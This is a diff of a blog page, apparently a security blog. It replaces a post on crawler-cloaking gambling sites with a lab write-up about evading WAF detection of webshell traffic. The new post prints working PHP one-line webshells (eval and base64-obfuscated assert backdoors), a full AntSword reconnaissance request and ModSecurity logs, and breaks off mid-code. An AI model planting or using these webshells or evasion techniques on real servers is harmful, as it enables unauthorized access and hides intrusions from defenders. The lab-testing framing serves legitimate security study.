@@ -6,24 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>菠菜的一种伪装方式 | T1ger</title>
+  <title>waf对webshell流量检测的性能分析 | T1ger</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一、 背景在百度搜索我的目标关键词的时候，本来找的是目标公司的内容，但是意外地发现了一些菠菜网站的链接，百度快照里的内容和我的目标公司首页内容一致，本着感性趣的态度点进去，看看是什么">
-<meta name="keywords" content="流量分析,菠菜">
+  <meta name="description" content="前言最近在一次授权渗透测试中遇到了一个棘手的场景，万能的队友已经找到了后台上传点，并传了小马然后开心地用antsword进行连接，但是由于明文传输很快被waf感知，并引起了管理员的注意，很快我们的马失效了，真是偷鸡不成蚀把米。痛定思痛，我们判断对方并不能尽快修复漏洞，于是临阵抱佛脚，寄希望于通过加密算法提高攻击的质量。首先要做三件事，第一，迅速在本地复现对方环境，第二，配置各种加密攻击流量载荷，第">
 <meta property="og:type" content="article">
-<meta property="og:title" content="菠菜的一种伪装方式">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;index.html">
+<meta property="og:title" content="waf对webshell流量检测的性能分析">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;index.html">
 <meta property="og:site_name" content="T1ger">
-<meta property="og:description" content="一、 背景在百度搜索我的目标关键词的时候，本来找的是目标公司的内容，但是意外地发现了一些菠菜网站的链接，百度快照里的内容和我的目标公司首页内容一致，本着感性趣的态度点进去，看看是什么">
+<meta property="og:description" content="前言最近在一次授权渗透测试中遇到了一个棘手的场景，万能的队友已经找到了后台上传点，并传了小马然后开心地用antsword进行连接，但是由于明文传输很快被waf感知，并引起了管理员的注意，很快我们的马失效了，真是偷鸡不成蚀把米。痛定思痛，我们判断对方并不能尽快修复漏洞，于是临阵抱佛脚，寄希望于通过加密算法提高攻击的质量。首先要做三件事，第一，迅速在本地复现对方环境，第二，配置各种加密攻击流量载荷，第">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;bocai2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;bocai1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;bocai3.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;bocai4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;bocai5.png">
-<meta property="og:updated_time" content="2019-12-08T03:20:40.487Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;5.png">
+<meta property="og:updated_time" content="2020-01-30T06:25:18.863Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F&#x2F;bocai2.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F&#x2F;2.png">
   
     <link rel="alternative" href="/atom.xml" title="T1ger" type="application/atom+xml">
   
@@ -167,44 +166,82 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-菠菜的一种伪装方式" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-加密连接webshell的攻击流量" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      菠菜的一种伪装方式
+      waf对webshell流量检测的性能分析
     </h1>
   
 
         
-        <a href="/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/" class="archive-article-date">
-  	<time datetime="2019-11-22T04:03:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-22</time>
+        <a href="/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/" class="archive-article-date">
+  	<time datetime="2020-01-29T12:11:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、-背景"><a href="#一、-背景" class="headerlink" title="一、 背景"></a>一、 背景</h2><p>在百度搜索我的目标关键词的时候，本来找的是目标公司的内容，但是意外地发现了一些菠菜网站的链接，百度快照里的内容和我的目标公司首页内容一致，本着感性趣的态度点进去，看看是什么<br><img src="/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/bocai2.png" alt="avatar" style="zoom:55%;"></p>
-<a id="more"></a>
-<p><img src="/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/bocai1.png" alt="avatar"><br>大都是一些菠菜网站，这里列出几个网址，大家警惕：<br> <a href="http://www.zgsyhm.com/" target="_blank" rel="noopener">http://www.zgsyhm.com/</a><br> <a href="https://www.fd3344.com/home/" target="_blank" rel="noopener">https://www.fd3344.com/home/</a><br>那么问题来了，这些菠菜网站挂着这些毫不相干的pages干啥呢？</p>
-<h2 id="二、分析过程"><a href="#二、分析过程" class="headerlink" title="二、分析过程"></a>二、分析过程</h2><h3 id="2-1-判断是否为服务器被黑"><a href="#2-1-判断是否为服务器被黑" class="headerlink" title="2.1 判断是否为服务器被黑"></a>2.1 判断是否为服务器被黑</h3><p>根据以往遇到的情况，拍脑袋会认为服务器被黑了，然后直接跳到黑页这里，随即看了下他们的IP，发现都是阿里云香港，对比着目标公司的IP，发现并不一样，这条排除</p>
-<h3 id="2-2-判断是否是首页的JS跳转"><a href="#2-2-判断是否是首页的JS跳转" class="headerlink" title="2.2 判断是否是首页的JS跳转"></a>2.2 判断是否是首页的JS跳转</h3><p>那就很有意思了，那想着会不会是JS渲染+跳转，以前也遇到过这种，相当于披着一层衣服的菠菜<br>正常地进行了单步调试抓包模式，发现基本的访问流程都是这个样子</p>
-<h4 id="首页-gt-js跳转-gt-菠菜网站"><a href="#首页-gt-js跳转-gt-菠菜网站" class="headerlink" title="首页 -&gt; js跳转-&gt; 菠菜网站"></a>首页 -&gt; js跳转-&gt; 菠菜网站</h4><p>直接F12，一个首页的源代码如下：<br><img src="/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/bocai3.png" alt="avatar" style="zoom:80%;"></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL解码之后是： https://www.gztaifu.com/js/jquery.min1.1.js</span><br></pre></td></tr></table></figure>
-<p>这就说明确实是JS跳转，但是首页上并没有我查的目标关键词，那么问题来了，到底是什么原因导致菠菜快照上的内容和实际内容不一致呢？</p>
-<h3 id="2-3-推测菠菜的思路"><a href="#2-3-推测菠菜的思路" class="headerlink" title="2.3 推测菠菜的思路"></a>2.3 推测菠菜的思路</h3><p>这里我一开始是没有想出来的，请教了一个对灰产有研究的朋友，他说这种情况一般是正常公司首页被爬去给菠菜做伪装，这句话点醒了我，于是我整理了一下当前的信息：<br>菠菜主要目的：披一层衣服，避免被发现<br>菠菜最容易被发现的入口：百度、谷歌等很容易被监管部门找到的搜索引擎<br>菠菜最需要防御的对象：robots爬虫，百度快照的内容生成也是通过spider爬出来的，因此例如百度Spider、搜狗spider等是菠菜最怕的东西<br>这就很清楚了，接下来我去验证一下自己的猜想</p>
-<h3 id="2-4-模拟百度spider"><a href="#2-4-模拟百度spider" class="headerlink" title="2.4 模拟百度spider"></a>2.4 模拟百度spider</h3><p>模拟百度爬虫至少有三种方式：</p>
-<p>python模拟</p>
-<p>使用第三方模拟spider网站</p>
-<p>Chrome的UA插件<br>自然最省事的是用UA插件，我用的是 User-Agent Switcher - Options(小蓝色图标真好看)<br>查到了百度的spider的UA如下:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html）</span><br></pre></td></tr></table></figure>
-<p>很方便地加进去，然后选择该UA:<br><img src="/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/bocai4.png"><br>然后再次访问该页面，果然访问到了我想要看到的东西：<br><img src="/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/bocai5.png" alt="avatar" style="zoom:67%;"></p>
-<h2 id="三、-总结"><a href="#三、-总结" class="headerlink" title="三、 总结"></a>三、 总结</h2><p>根据经验，这种手法是菠菜服务器设置根据不同的UA提供不同的内容，加一条判断+转发即可。<br>​但这个事其实可以带来一些思考，比如说：</p>
-<p>菠菜网站这种伪装方式虽然起到了欺骗robots的效果，但是从人的角度来讲，相当于你穿了一层机器人认不出来的衣服，但这种衣服会被熟悉的人一眼认出来，也就是有暴露特征，从技术上讲这样可能更容易被发现</p>
-<p>这对于企业安全人员来说又是一个新的挑战，被别人穿衣服可不好受，可以针对性地检查检查有没有人在穿衣服，这些人为什么这样做，有没有办法防御？</p>
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近在一次授权渗透测试中遇到了一个棘手的场景，万能的队友已经找到了后台上传点，并传了小马然后开心地用antsword进行连接，但是由于明文传输很快被waf感知，并引起了管理员的注意，很快我们的马失效了，真是偷鸡不成蚀把米。<br>痛定思痛，我们判断对方并不能尽快修复漏洞，于是临阵抱佛脚，寄希望于通过加密算法提高攻击的质量。首先要做三件事，第一，迅速在本地复现对方环境，第二，配置各种加密攻击流量载荷，第三，用开源安全模块modsecurity测试载荷加密后的效果。<br> <a id="more"></a></p>
+<h4 id="本地环境组建"><a href="#本地环境组建" class="headerlink" title="本地环境组建"></a>本地环境组建</h4><p>从保留的截图来看，对方的php版本是5.6.40，所以我要搭一个apache+php5.6.40的测试环境。<br>打开virtualbox，链接复制出来一份系统，按照以下流程配置一遍。<br><img src="/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/2.png" alt="avatar"></p>
+<ol>
+<li><p>安装apache</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install -y httpd</span><br><span class="line">httpd -v</span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Aug  8 2019 11:41:18</span><br></pre></td></tr></table></figure></li>
+<li><p>安装php5.6</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">yum -y install php56w php56w-mysql php56w-gd libjpeg* php56w-ldap php56w-odbc php56w-pear php56w-xml php56w-xmlrpc php56w-mbstring php56w-bcmath </span><br><span class="line">yum -y install httpd php-gd56w php-intl56w php-mysql56w mod_ssl openssl mcrypt php5-mcrypt56w</span><br><span class="line">yum -y install php56w-mcrypt php56w-soap php56w-intl  php56w-pdo</span><br><span class="line">systemctl restart httpd.service</span><br><span class="line">php -v</span><br><span class="line"></span><br><span class="line">PHP 5.6.40 (cli) (built: Jan 12 2019 13:11:15) </span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br></pre></td></tr></table></figure>
+<p>做一个index.php用以显示phpinfo()，本机访问时为了测试方便关闭firewalld</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld         //当然也可以通过firewall-cmd去开放端口</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/1.png" alt="avatar"></p>
+</li>
+<li><p>为了后面查看攻击流量，再装一个wireshark，包含wireshark-gnome等等，直接用*替代了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install wireshark*</span><br></pre></td></tr></table></figure></li>
+<li><p>配置apache-modsecurity<br>手边没有waf设备，没法对流量进行测试，于是用mode-security，以及OWASP（开放Web应用程序安全性项目）核心规则集-CRS进行测试，纵然效果不如实际场景来的直观，但足以说明问题。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mod_security</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /etc/httpd</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/SpiderLabs/owasp-modsecurity- crs.git</span><br><span class="line">mv owasp-modsecurity-crs modsecurity.d</span><br><span class="line"><span class="built_in">cd</span> modsecurity-crs</span><br><span class="line">cp crs-setup.conf.example crs-setup.conf</span><br><span class="line"></span><br><span class="line">vi /etc/httpd/conf/httpd.conf</span><br><span class="line">Include conf.modules.d/*.conf</span><br><span class="line">Include modsecurity.d/owasp-modsecurity-crs/crs-setup.conf</span><br><span class="line">Include modsecurity.d/owasp-modsecurity-crs/rules/*.conf</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>
+
+<p>modsecurity的默认配置是检测到攻击会阻断，我们将它改为只记录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/httpd/conf.d/mod_security.conf</span><br><span class="line">SecRuleEngine On (拦截)</span><br><span class="line">SecRuleEngine  DetectionOnly 记录</span><br><span class="line"></span><br><span class="line">tail -f /var/<span class="built_in">log</span>/httpd/model/modsec_audit.log</span><br></pre></td></tr></table></figure>
+<p>测试一些攻击向量会在log里看到记录，证明配置完成。<br>环境搭建完成。</p>
+<h4 id="攻击流量配置、分析、检测"><a href="#攻击流量配置、分析、检测" class="headerlink" title="攻击流量配置、分析、检测"></a>攻击流量配置、分析、检测</h4><h5 id="明文php-webshell配置"><a href="#明文php-webshell配置" class="headerlink" title="明文php-webshell配置"></a>明文php-webshell配置</h5><p>首先写个一句话看明文webshell流量传输。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim test1.php</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'aaaa'</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>配置蚁剑进行连接<br><img src="/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/3.png" alt="avatar"></p>
+<h5 id="明文流量分析"><a href="#明文流量分析" class="headerlink" title="明文流量分析"></a>明文流量分析</h5><p>同时用wireshark查看测试连接的流量<br><img src="/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/4.png" alt="avatar"></p>
+</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">POST /test1.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.13</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 993</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">aaaa=@ini_set("display_errors", "0");</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out)&#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;;</span><br><span class="line">function asoutput()&#123;</span><br><span class="line">$output=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo "620e2fc";</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo "71a0ccfbc1";</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try&#123;</span><br><span class="line">$D=dirname($_SERVER["SCRIPT_FILENAME"] </span><br><span class="line">//dirname()函数获取给定文件路径中的目录部分，而$_SERVER['SCRIPT_FILENAME']全局预定义变量用于获取当前执行脚本的完整路径</span><br><span class="line">);</span><br><span class="line">if($D=="")</span><br><span class="line">$D=dirname($_SERVER["PATH_TRANSLATED"]); </span><br><span class="line">//如果没有获取到就用PATH_TRANSLATED,获取当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。Apache 2 用户可以使用httpd.conf 中的 AcceptPathInfo On 来定义 PATH_INFO。</span><br><span class="line">$R="&#123;$D&#125;";</span><br><span class="line">if(substr($D,0,1)!="/")</span><br><span class="line">&#123;</span><br><span class="line">foreach(range("C","Z")as $L)</span><br><span class="line">if(is_dir("&#123;$L&#125;:"))$R.="&#123;$L&#125;:";</span><br><span class="line">&#125;</span><br><span class="line">else&#123;$R.="/";&#125;</span><br><span class="line">$R.="	";</span><br><span class="line">//以上是判断windows或者linux盘符，进而把获取的目录信息存入变量</span><br><span class="line">$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";</span><br><span class="line">//posix_getegid()返回当前进程的有效用户组ID，posix_geteuid()返回当前进程的有效用户ID</span><br><span class="line">$s=($u)?$u["name"]:@get_current_user();</span><br><span class="line">//get_current_user()方法进行获得PHP当前脚本所有者名称</span><br><span class="line">$R.=php_uname();</span><br><span class="line">//php_uname返回运行 PHP 的系统的有关信息</span><br><span class="line">$R.="&#123;$s&#125;";</span><br><span class="line">echo $R;;&#125;</span><br><span class="line">catch(Exception $e)</span><br><span class="line">&#123;echo "ERROR://".$e-&gt;getMessage();&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();//输出</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 29 Jan 2020 12:53:30 GMT</span><br><span class="line">Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.6.40</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Content-Length: 136</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">620e2fc/var/www/html./.Linux localhost.localdomain 3.10.0-1062.9.1.el7.x86_64 #1 SMP Fri Dec 6 15:49:49 UTC 2019 x86_64.apache71a0ccfbc1</span><br></pre></td></tr></table></figure>
+<p>为了更加清楚antsword发出的流量包，我认真看了一下发的包，并查了一些相关函数，做注释的同时感叹了PHP函数的牛逼，并勾起了我的好奇心，对这几个函数做了本地测试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> posix_getegid();</span><br><span class="line"><span class="built_in">echo</span> posix_getlogin();</span><br><span class="line"><span class="built_in">echo</span> get_current_user();</span><br><span class="line"><span class="built_in">echo</span> php_uname();</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">t1ger</span><br><span class="line">root</span><br><span class="line">Linux localhost.localdomain 3.10.0-1062.9.1.el7.x86_64 #1 SMP Fri Dec 6 15:49:49 UTC 2019 x86_64</span><br></pre></td></tr></table></figure>
+<p>果然牛逼！和返回包现象保持了一致。同时也说明了如果明文直接进行探测，这种流量在waf面前无异于自投罗网！</p>
+<h5 id="明文流量检测"><a href="#明文流量检测" class="headerlink" title="明文流量检测"></a>明文流量检测</h5><p>waf测试结果如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/etc/httpd/modsecurity.d/owasp-modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "708"] [id "920350"] [msg "Host header is a numeric IP address"] [data "192.168.1.13"] [severity "WARNING"] [ver "OWASP_CRS/3.2.0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "OWASP_CRS/PROTOCOL_VIOLATION/IP_HOST"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]</span><br><span class="line">Message: Warning.</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">Apache-Handler: php5-script</span><br><span class="line">Stopwatch: 1580358081210887 7750 (- - -)</span><br><span class="line">Stopwatch2: 1580358081210887 7750; combined=5379, p1=753, p2=4202, p3=42, p4=155, p5=227, sr=194, sw=0, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/); OWASP_CRS/3.2.0.</span><br><span class="line">Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.6.40</span><br><span class="line">Engine-Mode: "DETECTION_ONLY"</span><br></pre></td></tr></table></figure>
+<p>统计数据如下，匹配规则数按照grep line|wc -l计算<br>| Apache-Error | Message | 匹配规则数 | level |<br>| ———— | ——- | ———- | —– |<br>| 11           | 11      | 22         | 3     |<br>接下来我们先测对称密码。</p>
+<h5 id="Base64-amp-amp-rot13-webshell配置"><a href="#Base64-amp-amp-rot13-webshell配置" class="headerlink" title="Base64&amp;&amp;rot13 webshell配置"></a>Base64&amp;&amp;rot13 webshell配置</h5><p>Antsword自带几个可供测试的shell，给我们提供了非常大的方便。我顺便贴一下代码。<br>先来看看base64的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ant=base64_decode(<span class="string">"YXNzZXJ0"</span>);</span><br><span class="line">$ant($_POST[<span class="string">'ant'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="Base64-amp-amp-rot13-流量分析"><a href="#Base64-amp-amp-rot13-流量分析" class="headerlink" title="Base64&amp;&amp;rot13 流量分析"></a>Base64&amp;&amp;rot13 流量分析</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /php_assert_script.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.13</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 942</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span 